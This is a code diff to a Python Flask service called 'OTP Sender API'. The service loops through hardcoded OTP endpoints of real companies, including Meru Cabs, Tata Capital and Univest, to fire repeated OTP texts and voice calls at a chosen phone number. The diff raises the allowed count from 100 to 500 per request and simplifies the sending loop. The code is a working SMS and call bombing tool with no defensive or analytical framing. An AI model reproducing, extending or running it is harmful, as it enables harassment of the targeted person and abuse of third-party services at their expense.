@@ -2,9 +2,6 @@ from flask import Flask, request, jsonify
 import requests
 import json
 import time
-import threading
-import random
-import string
 import os
 from flask_cors import CORS
 
@@ -45,7 +42,6 @@ APIS = [
         "url": "https://merucabapp.com/api/otp/generate",
         "method": "POST",
         "headers": {
-            "Mobilenumber": "",
             "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
             "AppVersion": "245",
             "ApiVersion": "6.2.55",
@@ -116,9 +112,7 @@ APIS = [
         "name": "TataCapital",
         "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
         "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-        },
+        "headers": {"Content-Type": "application/json"},
         "data": lambda phone: json.dumps({"phone": phone, "applSource": "", "isOtpViaCallAtLogin": "true"})
     },
     {
@@ -287,9 +281,7 @@ APIS = [
         "name": "Univest",
         "url": "https://api.univest.in/api/auth/send-otp",
         "method": "GET",
-        "headers": {
-            "User-Agent": "okhttp/3.9.1",
-        },
+        "headers": {"User-Agent": "okhttp/3.9.1"},
         "data": None,
         "url_builder": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}"
     },
@@ -334,39 +326,12 @@ APIS = [
 
 @app.route("/", methods=["GET"])
 def home():
-    return """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>🔥 OTP Sender API</title>
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <style>
-            body { background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
-            input { padding: 10px; width: 80%; max-width: 300px; background: #111; color: #0f0; border: 1px solid #0f0; }
-            button { padding: 10px 20px; background: #0f0; color: #000; border: none; cursor: pointer; font-weight: bold; }
-            pre { text-align: left; background: #111; padding: 10px; max-height: 400px; overflow: auto; }
-        </style>
-    </head>
-    <body>
-        <h1>🔥 OTP Sender API</h1>
-        <p>Total APIs: """ + str(len(APIS)) + """</p>
-        <input type="text" id="phone" placeholder="Enter Phone Number">
-        <input type="number" id="count" placeholder="Count" value="10">
-        <button onclick="send()">Send OTP</button>
-        <pre id="result"></pre>
-        <script>
-        async function send() {
-            var phone = document.getElementById('phone').value;
-            var count = document.getElementById('count').value;
-            document.getElementById('result').textContent = 'Sending...';
-            var resp = await fetch('/send=' + phone + '&count=' + count);
-            var data = await resp.json();
-            document.getElementById('result').textContent = JSON.stringify(data, null, 2);
-        }
-        </script>
-    </body>
-    </html>
-    """
+    return jsonify({
+        "service": "OTP Sender API",
+        "usage": "/send=PHONE&count=NUMBER",
+        "example": "/send=1234567890&count=50",
+        "total_apis": len(APIS)
+    })
 
 @app.route("/send=<phone>&count=<count>", methods=["GET"])
 def send_otp(phone, count):
@@ -377,8 +342,8 @@ def send_otp(phone, count):
         if not phone.isdigit() or len(phone) < 10:
             return jsonify({"success": False, "error": "Invalid phone number"}), 400
         
-        if count < 1 or count > 100:
-            return jsonify({"success": False, "error": "Count 1-100 ke beech hona chahiye"}), 400
+        if count < 1 or count > 500:
+            return jsonify({"success": False, "error": "Count 1-500"}), 400
         
         results = []
         successful = 0
@@ -386,7 +351,6 @@ def send_otp(phone, count):
         
         for i in range(count):
             api = APIS[i % len(APIS)]
-            api_name = api["name"]
             
             try:
                 if "url_builder" in api and api["url_builder"]:
@@ -394,41 +358,26 @@ def send_otp(phone, count):
                 else:
                     url = api["url"]
                 
-                if api["data"]:
-                    data = api["data"](phone)
-                else:
-                    data = None
+                data = api["data"](phone) if api["data"] else None
                 
                 if api["method"] == "POST":
-                    if api["headers"].get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
-                        resp = requests.post(url, headers=api["headers"], data=data, timeout=10)
-                    else:
-                        resp = requests.post(url, headers=api["headers"], data=data, timeout=10)
+                    resp = requests.post(url, headers=api["headers"], data=data, timeout=10)
                 else:
                     resp = requests.get(url, headers=api["headers"], timeout=10)
                 
                 status = resp.status_code
+                ok = status in [200, 201, 202, 204]
                 
-                results.append({
-                    "attempt": i + 1,
-                    "api": api_name,
-                    "status_code": status,
-                    "success": status in [200, 201, 202, 204]
-                })
-                
-                if status in [200, 201, 202, 204]:
+                if ok:
                     successful += 1
                 else:
                     failed += 1
+                
+                results.append({"attempt": i+1, "api": api["name"], "status_code": status, "success": ok})
                     
             except Exception as e:
-                results.append({
-                    "attempt": i + 1,
-                    "api": api_name,
-                    "error": str(e)[:100],
-                    "success": False
-                })
                 failed += 1
+                results.append({"attempt": i+1, "api": api["name"], "error": str(e)[:50], "success": False})
             
             time.sleep(0.2)
         
@@ -438,7 +387,7 @@ def send_otp(phone, count):
             "total_sent": count,
             "successful": successful,
             "failed": failed,
-            "results": results
+            "results": results[:20]
         }), 200
         
     except ValueError:
